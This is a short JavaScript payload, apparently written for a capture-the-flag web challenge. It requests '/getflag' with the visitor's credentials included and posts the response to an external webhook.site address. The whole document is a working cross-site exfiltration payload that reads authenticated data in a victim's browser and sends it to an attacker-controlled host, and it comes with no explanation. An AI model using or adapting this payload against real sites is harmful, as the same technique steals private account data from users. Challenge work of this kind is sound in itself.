fetch("/getflag", { credentials: "include" })
  .then(r => r.text())
  .then(flag => {
    fetch("	https://webhook.site/9e9b0fae-1211-4d2f-b5f9-5cf25e9fa220", {
      method: "POST",
      mode: "no-cors",
      body: flag
    });
  });
